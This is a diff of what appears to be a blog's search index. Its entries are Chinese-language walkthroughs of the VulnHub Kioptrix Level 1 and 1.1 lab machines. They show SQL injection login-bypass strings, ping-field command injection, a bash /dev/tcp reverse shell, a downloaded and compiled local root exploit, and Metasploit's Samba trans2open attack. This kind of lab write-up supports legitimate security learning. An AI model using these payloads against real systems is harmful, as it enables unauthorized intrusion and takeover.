@@ -253,62 +253,6 @@
       </tags>
   </entry>
   <entry>
-    <title>KIOPTRIX: LEVEL 1.1</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
-<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
-<br>
-<br>
-
-<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
-<li>匯入 VMware</li>
-<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
-<li><a class="link" href="https://youtu.be/vWQWikIR4Xw?si=F1F5dTH6T0kh-1ix">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkmCJdoFT.png" alt="image"></li>
-</ul>
-<br>
-<br>
-
-<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用<code>ifconfig</code>查看自己的IP。<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1C5JOsK6.png" alt="image"></p>
-<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.0.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAGeuoYa.png" alt="image"></p>
-<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.0.9</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyhIe_jF6.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟二、尋找進入點"><a href="#步驟二、尋找進入點" class="headerlink" title="步驟二、尋找進入點"></a>步驟二、尋找進入點</h2><p>因為有http與https服務，所以網址列<code>http://192.168.0.9/</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyVGfOiKa.png" alt="image"></p>
-<p>檢視頁面來源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B14jGuoKa.png" alt="image"></p>
-<p>嘗試使用 <a class="link" href="https://stackoverflow.com/questions/53688134/what-is-the-meaning-of-admin-or-1-1">SQL Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在Username輸入：<br><code> ' or 1=1#</code> 或<code>admin' or '1'='1'/*</code>或<code>admin' #</code>或<code>admin' or 1=1-- </code>。<br><code>admin' --</code>與<code>admin' or 1=1--</code>實作無效，因為<code>--</code>後面需要空格。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyNWCciFT.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟三、RCE-Remote-Code-Execution"><a href="#步驟三、RCE-Remote-Code-Execution" class="headerlink" title="步驟三、RCE(Remote Code Execution)"></a>步驟三、RCE(Remote Code Execution)</h2><p>進入後會得到一個ping頁面。<br>127.0.0.1（本地主機）。<br>透過RCE尋找有用資訊並控制。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByVmXjiYp.png" alt="image"></p>
-<p><code>ping 127.0.0.1;pwd</code>或<code>ping 127.0.0.1|pwd</code>。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJAFmsjFT.png" alt="image"></p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkyYXosFp.png" alt="image"></p>
-<p><code>ping 127.0.0.1|ls</code>。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvpXsjF6.png" alt="image"><br><br></p>
-<p>參考 <a class="link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>與自己建立了一個 TCP 反向 shell 連接，將目標系統的<br>標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。</p>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByeYzhjtT.png" alt="image"></p>
-<p>先打好<code>nc -nvlp 8888</code>送出再網頁輸入。<br><code>ping 127.0.0.1|bash -i &gt;&amp; /dev/tcp/192.168.0.8/8888 0&gt;&amp;1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HycNH2jKa.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkRfH3iKa.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvJunsYa.png" alt="image"><br>LSB 的全稱是 “Linux Standard Base”（Linux 標準基準）。LSB 是一個開放標準，定義了 Linux 操作系統的核心元件和應用程式的標準接口，以確保不同 Linux 發行版之間的二進制兼容性。<br><br><br><br></p>
-<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
-<p>searchsploit 是 Exploit Database 中的一個工具，用於搜索漏洞利用程式（exploits）和Shellcode的資料庫。Exploit Database 是一個包含各種漏洞利用程式、Shellcode和相關資訊的公共資料庫，旨在協助渗透測試和安全研究。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk2oYnjKp.png" alt="image"><br><br><br><br></p>
-<p><code>searchsploit -m linux_x86/local/9542.c</code></p>
-<p>searchsploit -m linux/local/9542.c 是一個使用 searchsploit 工具的命令。在這個命令中，-m 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux/local/9542.c 的漏洞利用程式文件複製到當前工作目錄。-m 選項使您能夠在不離開命令行的情況下複製漏洞利用程式文件。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1uqIpoYa.png" alt="image"></p>
-<br>
-<br>
-
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.0.8/9542.c</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJbFVToFp.png" alt="image"></p>
-<p>因為沒有起相關http服務被拒絕，因此<code>pytho3 -m http.server 80</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJmbp2itT.png" alt="image"></p>
-<p>再一次<code>wget http://192.168.0.8/9542.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJA3Vaitp.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc -o exploit 9542.c</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkcfUpsFT.png" alt="image"></p>
-<p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HackTheBox</title>
     <url>/2024/12/09/HackTheBox/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
@@ -370,6 +314,58 @@
       </tags>
   </entry>
   <entry>
+    <title>KIOPTRIX: LEVEL 1</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Description</strong><br>KIOPTRIX VM IMAGE CHALLENGES:<br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
+<li>匯入 VMware<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1IEeaOKp.png" alt="image"></li>
+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/9cKhZaYecM4?si=v4t-Rware1D48a8Z">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByNlUGtFp.png" alt="image"></li>
+</ul>
+<br>
+<br>
+
+
+<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用ifconfig查看自己的IP。<code>192.168.1.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJshOmKYT.png" alt="image"></p>
+<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.1.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJTDdXKFp.png" alt="image"></p>
+<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.1.104</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkJSYmKKT.png" alt="image"></p>
+<br>
+    
+<h2 id="步驟二、尋找漏洞"><a href="#步驟二、尋找漏洞" class="headerlink" title="步驟二、尋找漏洞"></a>步驟二、尋找漏洞</h2><p>Metasploit 框架是一個功能豐富的開源渗透測試框架，其中的 msfconsole 是其<br>主要命令行界面，提供了一個互動式的控制台，用於進行漏洞測試和攻擊模擬。</p>
+<ol>
+<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<br>
+<br>
+
+<p><code>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</code> 很可疑。<br>smbd 是 Samba 軟體套件中的一個核心組件，是 Samba Daemon 的縮寫。Samba 是一個開源的軟體套件，提供了與 Microsoft Windows 互通的 SMB/CIFS 協定的實現。Samba 允許非 Windows 系統（例如 Linux、Unix）與 Windows 系統共享檔案、印表機和其他資源。smbd 是 Samba 中負責實現 SMB（Server Message Block）協定的守護進程，它允許其他機器通過 SMB/CIFS 協定訪問和共享資源。這使得 Linux/Unix 系統能夠擔任文件伺服器，與 Windows 系統協同工作，共享檔案和資源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1ack4FY6.png" alt="image"><br><br><br>使用 msfconsole 查看。<code>sudo msfconsole</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByKQyEKFp.png" alt="image"><br><br><br>查看<code>search smb_version</code>。使用<code>use 0</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7BgNYFT.png" alt="image"><br><br><br><code> options</code>。<br>在 Metasploit 框架中，options 是一個用於查看和配置模組（payload、exploit、auxiliary 等）參數的指令。這個指令允許你檢視目前模組的參數配置狀態，以及進行必要的修改。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJHFbEFta.png" alt="image"><br><br><br>設置<code>RHOSTS</code>參數為<code>192.169.1.104</code>。<br><code>set RHOSTS 192.168.1.104</code>。再<code>show options</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkDkfVttT.png" alt="image"><br><br><br><code>exploit</code>。得到smba版本<code>Samba 2.2.1a</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryKvG4KYp.png" alt="image"><br><br></p>
+<h2 id="步驟三、查找漏洞版本問題"><a href="#步驟三、查找漏洞版本問題" class="headerlink" title="步驟三、查找漏洞版本問題"></a>步驟三、查找漏洞版本問題</h2><p>Google <code>Samba 2.2.1a</code>在msfconsole上<a class="link" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">應用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rySDQEYFp.png" alt="image"></p>
+<p>找到使用<code>trans2open</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByXQSwtt6.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1k4IvKFa.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1La8wKYT.png" alt="image"></p>
+<p><code>exploit</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgfwDtYa.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyThuwKFa.png" alt="image"><br>對於 generic/shell_reverse_tcp 這樣的 payload，它是一個反向 shell 載荷，通常設計成能夠與目標系統建立反向的 TCP 連接，以提供互動式的 shell 會話。generic 的使用表示這個 payload 將根據攻擊環境的具體情況進行一些通用的調整，以確保它在不同情境下的兼容性。<br><br></p>
+<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyFKOPtKp.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>KIOPTRIX: LEVEL 1.3</title>
     <url>/2024/11/30/KIOPTRIX-LEVEL-1-3/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/" >Target<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -423,52 +419,56 @@
       </tags>
   </entry>
   <entry>
-    <title>KIOPTRIX: LEVEL 1</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Description</strong><br>KIOPTRIX VM IMAGE CHALLENGES:<br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+    <title>KIOPTRIX: LEVEL 1.1</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
 <p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
 <br>
 <br>
 
 <h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
-<li>匯入 VMware<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1IEeaOKp.png" alt="image"></li>
+<li>匯入 VMware</li>
 <li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
-<li><a class="link" href="https://youtu.be/9cKhZaYecM4?si=v4t-Rware1D48a8Z">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByNlUGtFp.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/vWQWikIR4Xw?si=F1F5dTH6T0kh-1ix">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkmCJdoFT.png" alt="image"></li>
 </ul>
 <br>
 <br>
 
-
-<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用ifconfig查看自己的IP。<code>192.168.1.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJshOmKYT.png" alt="image"></p>
-<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.1.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJTDdXKFp.png" alt="image"></p>
-<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.1.104</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkJSYmKKT.png" alt="image"></p>
+<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用<code>ifconfig</code>查看自己的IP。<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1C5JOsK6.png" alt="image"></p>
+<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.0.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAGeuoYa.png" alt="image"></p>
+<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.0.9</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyhIe_jF6.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟二、尋找進入點"><a href="#步驟二、尋找進入點" class="headerlink" title="步驟二、尋找進入點"></a>步驟二、尋找進入點</h2><p>因為有http與https服務，所以網址列<code>http://192.168.0.9/</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyVGfOiKa.png" alt="image"></p>
+<p>檢視頁面來源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B14jGuoKa.png" alt="image"></p>
+<p>嘗試使用 <a class="link" href="https://stackoverflow.com/questions/53688134/what-is-the-meaning-of-admin-or-1-1">SQL Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在Username輸入：<br><code> ' or 1=1#</code> 或<code>admin' or '1'='1'/*</code>或<code>admin' #</code>或<code>admin' or 1=1-- </code>。<br><code>admin' --</code>與<code>admin' or 1=1--</code>實作無效，因為<code>--</code>後面需要空格。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyNWCciFT.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟三、RCE-Remote-Code-Execution"><a href="#步驟三、RCE-Remote-Code-Execution" class="headerlink" title="步驟三、RCE(Remote Code Execution)"></a>步驟三、RCE(Remote Code Execution)</h2><p>進入後會得到一個ping頁面。<br>127.0.0.1（本地主機）。<br>透過RCE尋找有用資訊並控制。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByVmXjiYp.png" alt="image"></p>
+<p><code>ping 127.0.0.1;pwd</code>或<code>ping 127.0.0.1|pwd</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJAFmsjFT.png" alt="image"></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkyYXosFp.png" alt="image"></p>
+<p><code>ping 127.0.0.1|ls</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvpXsjF6.png" alt="image"><br><br></p>
+<p>參考 <a class="link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>與自己建立了一個 TCP 反向 shell 連接，將目標系統的<br>標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByeYzhjtT.png" alt="image"></p>
+<p>先打好<code>nc -nvlp 8888</code>送出再網頁輸入。<br><code>ping 127.0.0.1|bash -i &gt;&amp; /dev/tcp/192.168.0.8/8888 0&gt;&amp;1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HycNH2jKa.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkRfH3iKa.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvJunsYa.png" alt="image"><br>LSB 的全稱是 “Linux Standard Base”（Linux 標準基準）。LSB 是一個開放標準，定義了 Linux 操作系統的核心元件和應用程式的標準接口，以確保不同 Linux 發行版之間的二進制兼容性。<br><br><br><br></p>
+<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
+<p>searchsploit 是 Exploit Database 中的一個工具，用於搜索漏洞利用程式（exploits）和Shellcode的資料庫。Exploit Database 是一個包含各種漏洞利用程式、Shellcode和相關資訊的公共資料庫，旨在協助渗透測試和安全研究。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk2oYnjKp.png" alt="image"><br><br><br><br></p>
+<p><code>searchsploit -m linux_x86/local/9542.c</code></p>
+<p>searchsploit -m linux/local/9542.c 是一個使用 searchsploit 工具的命令。在這個命令中，-m 表示 “mirror”（鏡像），它的作用是將 Exploit Database 中路徑為 linux/local/9542.c 的漏洞利用程式文件複製到當前工作目錄。-m 選項使您能夠在不離開命令行的情況下複製漏洞利用程式文件。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1uqIpoYa.png" alt="image"></p>
 <br>
-    
-<h2 id="步驟二、尋找漏洞"><a href="#步驟二、尋找漏洞" class="headerlink" title="步驟二、尋找漏洞"></a>步驟二、尋找漏洞</h2><p>Metasploit 框架是一個功能豐富的開源渗透測試框架，其中的 msfconsole 是其<br>主要命令行界面，提供了一個互動式的控制台，用於進行漏洞測試和攻擊模擬。</p>
-<ol>
-<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
